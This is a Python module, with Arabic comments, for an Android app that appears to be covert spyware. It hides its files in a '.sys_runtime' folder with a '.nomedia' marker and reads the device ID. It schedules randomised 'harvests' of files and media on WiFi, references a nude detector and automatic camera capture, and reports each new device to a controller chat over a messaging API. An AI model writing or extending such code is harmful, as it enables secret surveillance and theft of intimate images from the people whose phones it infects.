# -*- coding: utf-8 -*-
import os
import time
import json
import random
import threading
import logging
import hashlib
from datetime import datetime, timedelta

def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
if not os.path.exists(P):
    os.makedirs(P)

logging.basicConfig(
    filename=os.path.join(P, "m.log"),
    level=logging.ERROR,
    filemode='a',
    format='%(asctime)s [%(levelname)s] %(message)s'
)

try:
    from jnius import autoclass
    JNI = True
except ImportError:
    JNI = False

# ========== دالة fromisoformat آمنة (محسّنة) ==========
def _parse_iso_datetime(iso_string):
    """
    فك تشفير تاريخ ISO بشكل آمن (متوافق مع Python 3.6+)
    """
    if not iso_string or not isinstance(iso_string, str):
        return None

    iso_string = iso_string.strip()
    if not iso_string:
        return None

    iso_string = iso_string.replace('Z', '+00:00')

    try:
        return datetime.fromisoformat(iso_string)
    except (ValueError, AttributeError):
        pass

    for fmt in ("%Y-%m-%dT%H:%M:%S.%f", "%Y-%m-%dT%H:%M:%S", "%Y-%m-%d %H:%M:%S"):
        try:
            clean_str = iso_string[:19] if len(iso_string) >= 19 else iso_string
            return datetime.strptime(clean_str, fmt)
        except ValueError:
            continue

    logging.warning(f"Could not parse datetime: {iso_string}")
    return None


class M:
    def __init__(self):
        self.d = P
        self.cf = os.path.join(self.d, "c.json")
        self.lh = os.path.join(self.d, "lh")
        self.wt = os.path.join(self.d, "wt")

        self.rn = True
        self.did = None
        self.dmd = None
        self.last_mid = 0

        self.ui = None
        self.daily_zipper = None
        self.camera_analyzer = None
        self.nude_detector = None
        self.media_scanner = None
        self.ctrl = None
        self.vlt = None

        # أحداث التحكم
        self._wake_event = threading.Event()
        self._harvest_lock = threading.Lock()
        self._harvest_running = False

        self._load_config()
        self._get_device_info()
        self._setup()

    def _setup(self):
        """إعداد المجلدات والملفات الأولية"""
        try:
            nomedia_path = os.path.join(self.d, ".nomedia")
            if not os.path.exists(nomedia_path):
                with open(nomedia_path, 'w') as f:
                    f.write("")
        except:
            pass

        self._ensure_next_harvest_time()

    # ========== إدارة الإعدادات ==========
    def _load_config(self):
        """تحميل الإعدادات مع قيم افتراضية محسّنة"""
        default_cfg = {
            "hth": 15,
            "wl": False,
            "iv": 900,
            "harvest_min_interval": 7200,
            "harvest_random_hours_min": 2,
            "harvest_random_hours_max": 6,
            "auto_camera": False,
            "camera_interval": 3600,
            "max_harvest_files": 200,
            "force_harvest_on_start": False,
            "scan_on_start": True,
            "min_wifi_strength": -80,
            "enable_auto_harvest": True
        }

        if os.path.exists(self.cf):
            try:
                with open(self.cf, 'r', encoding='utf-8') as f:
                    loaded = json.load(f)
                    default_cfg.update(loaded)
            except Exception as e:
                logging.error(f"Config load error: {e}")

        self.cfg = default_cfg

        if not os.path.exists(self.cf):
            self._save_config()

    def _save_config(self):
        try:
            with open(self.cf, 'w', encoding='utf-8') as f:
                json.dump(self.cfg, f, indent=2, ensure_ascii=False)
        except Exception as e:
            logging.error(f"Config save error: {e}")

    # ========== معلومات الجهاز ==========
    def _get_ctx(self):
        if not JNI:
            return None
        try:
            return autoclass('org.kivy.android.PythonActivity').mActivity
        except:
            return None

    def _get_device_info(self):
        if JNI:
            try:
                ctx = self._get_ctx()
                if ctx is None:
                    raise Exception("No context")
                Build = autoclass('android.os.Build')
                Secure = autoclass('android.provider.Settings$Secure')
                resolver = ctx.getContentResolver()
                self.did = Secure.getString(resolver, Secure.ANDROID_ID)
                self.dmd = f"{Build.MANUFACTURER} {Build.MODEL}"
                if not self.did:
                    self.did = f"ID_{random.randint(100000, 999999)}"
            except Exception as e:
                logging.error(f"Device info error: {e}")
                self.did = f"ID_{random.randint(100000, 999999)}"
                self.dmd = "Android_Device"
        else:
            self.did, self.dmd = "DEV_PC", "Linux_System"

    # ========== حالة الشبكة والبطارية ==========
    def _is_wifi(self):
        if not JNI:
            return True
        try:
            ctx = self._get_ctx()
            if ctx is None:
                return False
            cm = ctx.getSystemService("connectivity")
            if cm is None:
                return False
            ni = cm.getActiveNetworkInfo()
            return ni and ni.isConnected() and ni.getType() == 1
        except Exception as e:
            logging.error(f"WiFi check error: {e}")
            return False

    def _battery_ok(self):
        if not JNI:
            return 100, True
        try:
            ctx = self._get_ctx()
            if ctx is None:
                return 50, False
            IntentFilter = autoclass('android.content.IntentFilter')
            battery_filter = IntentFilter("android.intent.action.BATTERY_CHANGED")
            battery_status = ctx.registerReceiver(None, battery_filter)
            if battery_status is None:
                return 50, False
            level = battery_status.getIntExtra("level", -1)
            scale = battery_status.getIntExtra("scale", -1)
            status = battery_status.getIntExtra("status", -1)
            percent = int((level / scale) * 100) if scale > 0 else 50
            is_charging = status in (2, 5)
            return percent, is_charging
        except Exception as e:
            logging.error(f"Battery check error: {e}")
            return 50, False

    # ========== إدارة وقت الحصاد (محسّن) ==========
    def _set_next_harvest_time(self, hours=None):
        try:
            if hours is None:
                min_h = self.cfg.get('harvest_random_hours_min', 2)
                max_h = self.cfg.get('harvest_random_hours_max', 6)
                hours = random.randint(min_h, max_h)
            minutes = random.randint(0, 59)
            target = datetime.now() + timedelta(hours=hours, minutes=minutes)

            with open(self.wt, 'w', encoding='utf-8') as f:
                f.write(target.isoformat())

            logging.info(f"Next harvest set to: {target.isoformat()} (in {hours}h {minutes}m)")
            return target
        except Exception as e:
            logging.error(f"Set next harvest error: {e}")
            return None

    def _ensure_next_harvest_time(self):
        if not os.path.exists(self.wt):
            self._set_next_harvest_time()
            return True

        try:
            with open(self.wt, 'r', encoding='utf-8') as f:
                time_str = f.read().strip()
            if not time_str:
                self._set_next_harvest_time()
                return True

            next_time = _parse_iso_datetime(time_str)
            if next_time is None or next_time < datetime.now():
                logging.warning("Next harvest time is invalid or expired, resetting...")
                self._set_next_harvest_time()
                return True
        except Exception as e:
            logging.error(f"Ensure next harvest error: {e}")
            self._set_next_harvest_time()
            return True

        return True

    def _update_last_harvest_time(self):
        try:
            with open(self.lh, 'w', encoding='utf-8') as f:
                f.write(datetime.now().isoformat())
        except Exception as e:
            logging.error(f"Update last harvest error: {e}")

    def _can_harvest(self, force=False):
        if force:
            return True, "Forced"

        if os.path.exists(self.wt):
            try:
                with open(self.wt, 'r', encoding='utf-8') as f:
                    next_time_str = f.read().strip()
                next_time = _parse_iso_datetime(next_time_str)
                if next_time and datetime.now() < next_time:
                    return False, f"Next harvest at {next_time}"
            except Exception as e:
                logging.error(f"Can harvest (wt) error: {e}")

        if os.path.exists(self.lh):
            try:
                with open(self.lh, 'r', encoding='utf-8') as f:
                    last_time_str = f.read().strip()
                last_time = _parse_iso_datetime(last_time_str)
                if last_time:
                    min_interval = self.cfg.get('harvest_min_interval', 7200)
                    if datetime.now() - last_time < timedelta(seconds=min_interval):
                        return False, "Minimum interval not reached"
            except Exception as e:
                logging.error(f"Can harvest (lh) error: {e}")

        return True, "OK"

    def get_next_harvest_time(self):
        if os.path.exists(self.wt):
            try:
                with open(self.wt, 'r', encoding='utf-8') as f:
                    time_str = f.read().strip()
                return _parse_iso_datetime(time_str)
            except Exception as e:
                logging.error(f"Get next harvest error: {e}")
        return None

    # ========== منطق الحصاد الرئيسي (محسّن) ==========
    def _harvest_logic(self, force=False):
        """منطق الحصاد الرئيسي مع دعم force لتجاوز القيود"""
        # التحقق من تمكين الحصاد التلقائي
        if not force and not self.cfg.get('enable_auto_harvest', True):
            logging.debug("Auto-harvest is disabled")
            return

        # استخدام قفل لمنع التشغيل المتزامن
        with self._harvest_lock:
            if self._harvest_running:
                logging.debug("Harvest already running, skipping")
                return
            self._harvest_running = True

        try:
            # 1. التحقق من WiFi (إلا إذا كان مفروضاً)
            if not force and not self._is_wifi():
                logging.debug("Not on WiFi, skipping harvest")
                return

            # 2. التحقق من البطارية
            battery, charging = self._battery_ok()
            min_battery = self.cfg.get('hth', 15)
            if not force and battery < min_battery and not charging:
                logging.info(f"Battery too low: {battery}% (min: {min_battery}%)")
                return

            # 3. التحقق من وقت الانتظار (يمكن تجاوزه بـ force)
            can_harvest, reason = self._can_harvest(force=force)
            if not can_harvest:
                logging.debug(f"Harvest skipped: {reason}")
                return

            # 4. تشغيل الحصاد
            harvest_success = False
            if self.daily_zipper and hasattr(self.daily_zipper, 'run'):
                try:
                    # تشغيل الحصاد في خيط منفصل حتى لا يحجب المراقبة
                    threading.Thread(target=self.daily_zipper.run, daemon=True).start()
                    harvest_success = True
                    logging.info("Harvest triggered successfully")
                except Exception as e:
                    logging.error(f"Harvest execution error: {e}")
            else:
                logging.warning("DailyZipper not available")

            # 5. تحديث الأوقات في حالة النجاح
            if harvest_success:
                self._set_next_harvest_time()
                self._update_last_harvest_time()
            else:
                if not force:
                    logging.warning("Harvest failed, rescheduling in 1 hour")
                    self._set_next_harvest_time(hours=1)

            # 6. تشغيل ماسح الوسائط (بغض النظر عن نجاح الحصاد)
            if self.media_scanner and hasattr(self.media_scanner, 'run_scan'):
                try:
                    self.media_scanner.run_scan(cleanup_first=True)
                except Exception as e:
                    logging.error(f"Scanner run error: {e}")

        except Exception as e:
            logging.error(f"Harvest logic error: {e}")
        finally:
            self._harvest_running = False

    # ========== الكاميرا التلقائية ==========
    def _camera_logic(self):
        if not self.cfg.get('auto_camera', False):
            return

        if not self.camera_analyzer or not hasattr(self.camera_analyzer, 'harvest'):
            return

        last_camera_file = os.path.join(self.d, "last_camera")
        interval = self.cfg.get('camera_interval', 3600)

        try:
            if os.path.exists(last_camera_file):
                with open(last_camera_file, 'r') as f:
                    last_time = float(f.read().strip())
                    if time.time() - last_time < interval:
                        return
        except Exception as e:
            logging.error(f"Camera interval check error: {e}")

        battery, charging = self._battery_ok()
        if battery < 20 and not charging:
            return

        try:
            threading.Thread(
                target=self.camera_analyzer.harvest,
                args=(0,),
                daemon=True
            ).start()

            with open(last_camera_file, 'w') as f:
                f.write(str(time.time()))

            logging.info("Auto-camera triggered")
        except Exception as e:
            logging.error(f"Camera logic error: {e}")

    # ========== الحلقة الرئيسية ==========
    def _loop(self):
        """الحلقة الرئيسية للمراقبة"""
        # تشغيل ماسح الوسائط عند البدء إذا كان مفعلاً
        if self.cfg.get('scan_on_start', True) and self.media_scanner:
            try:
                self.media_scanner.run_scan(cleanup_first=True)
                logging.info("Initial scan completed")
            except Exception as e:
                logging.error(f"Initial scan error: {e}")

        while self.rn:
            try:
                self._harvest_logic(force=False)
                self._camera_logic()
            except Exception as e:
                logging.error(f"Monitor loop error: {e}")

            interval = self.cfg.get('iv', 900)
            self._wake_event.wait(interval)
            self._wake_event.clear()

    # ========== واجهات التحكم العامة ==========
    def start(self):
        """بدء تشغيل المراقبة"""
        threading.Thread(target=self._loop, daemon=True, name="MonitorLoop").start()

        # تسجيل الجهاز
        if self.ui and self.did:
            try:
                if hasattr(self.ui, 'reg'):
                    self.ui.reg(self.did, self.dmd)
                elif hasattr(self.ui, '_api'):
                    ctrl = getattr(self, 'ctrl', None)
                    if ctrl:
                        self.ui._api("sendMessage", {
                            "chat_id": ctrl,
                            "text": f"📱 جهاز جديد متصل\nID: `{self.did}`\nModel: {self.dmd}",
                            "parse_mode": "Markdown"
                        })
            except Exception as e:
                logging.error(f"Device registration failed: {e}")

        # تشغيل حصاد فوري عند البدء إذا كان مفعلاً
        if self.cfg.get('force_harvest_on_start', False):
            logging.info("Starting forced harvest on startup")
            self.force_harvest()

    def stop(self):
        """إيقاف المراقبة"""
        self.rn = False
        self._wake_event.set()

    def force_harvest(self):
        """إجبار الحصاد على الفور (تجاوز كل القيود)"""
        # حذف ملف وقت الانتظار لتجاوز الشرط
        if os.path.exists(self.wt):
            try:
                os.remove(self.wt)
                logging.info("Removed waiting time file for forced harvest")
            except Exception as e:
                logging.error(f"Force harvest remove wt error: {e}")

        # تشغيل الحصاد في خيط منفصل
        threading.Thread(target=self._harvest_logic, args=(True,), daemon=True).start()

    def reset_harvest_timer(self):
        """إعادة ضبط مؤقت الحصاد (تعيين وقت عشوائي جديد)"""
        self._set_next_harvest_time()
        logging.info("Harvest timer reset")

    def update_config(self, key, value):
        """تحديث إعداد معين وحفظه"""
        if key in self.cfg:
            self.cfg[key] = value
            self._save_config()
            logging.info(f"Config updated: {key} = {value}")
            return True
        else:
            logging.warning(f"Unknown config key: {key}")
            return False

    def is_harvesting(self):
        """التحقق مما إذا كان الحصاد قيد التشغيل"""
        return self._harvest_running

    def get_status(self):
        """الحصول على حالة المراقبة (للتصحيح)"""
        status = {
            "running": self.rn,
            "harvest_running": self._harvest_running,
            "device_id": self.did,
            "device_model": self.dmd,
            "wifi": self._is_wifi(),
            "battery": self._battery_ok(),
            "config": self.cfg
        }
        if os.path.exists(self.lh):
            try:
                with open(self.lh, 'r') as f:
                    status["last_harvest"] = f.read().strip()
            except:
                status["last_harvest"] = None
        if os.path.exists(self.wt):
            try:
                with open(self.wt, 'r') as f:
                    status["next_harvest"] = f.read().strip()
            except:
                status["next_harvest"] = None
        return status


# ========== دوال مساعدة ==========
def get_device_tag():
    try:
        if JNI:
            Secure = autoclass('android.provider.Settings$Secure')
            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
            if ctx:
                aid = Secure.getString(ctx.getContentResolver(), Secure.ANDROID_ID)
                if aid:
                    return aid[:8].lower()
    except Exception as e:
        logging.debug(f"get_device_tag (JNI) error: {e}")

    try:
        if JNI:
            Build = autoclass('android.os.Build')
            model = f"{Build.MANUFACTURER} {Build.MODEL}"
            return hashlib.md5(model.encode()).hexdigest()[:8]
    except Exception as e:
        logging.debug(f"get_device_tag (Build) error: {e}")

    return "unknown"


# ========== دالة المصنع ==========
def create():
    return M()
